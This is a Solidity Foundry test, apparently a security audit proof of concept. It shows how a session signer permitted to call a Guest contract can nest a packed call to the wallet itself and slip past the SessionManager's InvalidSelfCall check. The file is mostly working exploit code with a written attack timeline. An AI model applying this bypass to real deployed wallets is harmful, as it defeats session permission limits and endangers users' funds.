// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/integrations/extensions/sessions/ExtendedSessionTestBase.sol";
import "../src/Guest.sol";
import "../src/Stage1Module.sol";
import "../src/Factory.sol";
import "../src/modules/Payload.sol";
import "../src/extensions/sessions/SessionErrors.sol";

// ATTACK TIMELINE:
// 1. [Setup] Deploy Guest contract and create a Wallet with a session signer.
// 2. [T=0] Session signer is granted permission to call the Guest contract (target != Wallet).
// 3. [T=1] Attacker constructs a payload calling Guest, with nested packed calls targeting the Wallet itself.
// 4. [T=2] Attacker signs and executes the payload via the Wallet's execute function.
// 5. [Assert] Verify that the execution bypasses the SessionManager's InvalidSelfCall restriction and does not revert.

contract AuditAgentPoC is ExtendedSessionTestBase {
    Guest Guest;

    function setUp() public virtual override {
        super.setUp();
        Guest = new Guest();
    }

    function test_exploit() public {
        // Step 1: Deploy Wallet with default topology
        bytes32 initImageHash = bytes32(uint256(1));
        Stage1Module targetWallet = Stage1Module(payable(Factory.deploy(address(module), initImageHash)));

        // Step 2: Update topology to allow session signer to call Guest contract
        SessionPermissions memory sessionPerms = SessionPermissions({
            signer: sessionWallet.addr,
            chainId: 0,
            valueLimit: 0,
            deadline: uint64(block.timestamp + 1 days),
            permissions: new Permission[](1)
        });
        sessionPerms.permissions[0] = Permission({ target: address(Guest), rules: new ParameterRule[](0) });

        string memory topology = _createTopology(sessionPerms);
        bytes32 sessionImageHash = PrimitivesRPC.sessionImageHash(vm, topology);
        string memory ce = string(
            abi.encodePacked("sapient:", vm.toString(sessionImageHash), ":", vm.toString(address(sessionManager)), ":1")
        );
        string memory updatedConfig = PrimitivesRPC.newConfig(vm, 1, 0, ce);
        bytes32 updatedImageHash = PrimitivesRPC.getImageHash(vm, updatedConfig);

        vm.prank(address(targetWallet));
        targetWallet.updateImageHash(updatedImageHash);

        // Step 3: Construct nested payload that targets the Wallet itself (Self Call)
        Payload.Decoded memory nestedPayload;
        nestedPayload.kind = Payload.KIND_TRANSACTIONS;
        nestedPayload.calls = new Payload.Call[](1);
        nestedPayload.calls[0] = Payload.Call({
            to: address(targetWallet),
            value: 0,
            data: hex"12345678",
            gasLimit: 0,
            delegateCall: false,
            onlyFallback: false,
            behaviorOnError: Payload.BEHAVIOR_REVERT_ON_ERROR
        });

        // Pack the nested payload to be sent as msg.data to Guest
        bytes memory packedNestedPayload = PrimitivesRPC.toPackedPayload(vm, nestedPayload);

        // Step 4: Construct outer payload calling Guest with the packed nested payload
        Payload.Decoded memory outerPayload;
        outerPayload.kind = Payload.KIND_TRANSACTIONS;
        outerPayload.calls = new Payload.Call[](1);
        outerPayload.calls[0] = Payload.Call({
            to: address(Guest),
            value: 0,
            data: packedNestedPayload,
            gasLimit: 0,
            delegateCall: false,
            onlyFallback: false,
            behaviorOnError: Payload.BEHAVIOR_REVERT_ON_ERROR
        });

        // Step 5: Sign the outer payload with the session Wallet
        uint8[] memory permissionIdxs = new uint8[](1);
        permissionIdxs[0] = 0;
        bytes memory signature = _validExplicitSignature(outerPayload, sessionWallet, updatedConfig, topology, permissionIdxs);

        // Step 6: Execute the payload. 
        // If the vulnerability exists, Guest will dispatch the nested call to the Wallet, 
        // bypassing the SessionManager's InvalidSelfCall check which only inspects the outer call.
        bytes memory packedOuterPayload = PrimitivesRPC.toPackedPayload(vm, outerPayload);

        // We expect this NOT to revert with InvalidSelfCall. 
        // It may revert with a different error (e.g. from the nested call failing or Guest fallback specifics), 
        // but it successfully bypasses the session self-call restriction.
        try targetWallet.execute(packedOuterPayload, signature) {
            // Execution succeeded or reverted inside the nested call, bypassing InvalidSelfCall
        } catch (bytes memory reason) {
            bytes4 errorSelector;
            if (reason.length >= 4) {
                assembly {
                    errorSelector := mload(add(reason, 32))
                }
            }
            // Assert that the error is NOT InvalidSelfCall
            assertTrue(
                errorSelector != SessionErrors.InvalidSelfCall.selector,
                "Bypassed InvalidSelfCall restriction via Guest contract"
            );
        }
    }
}
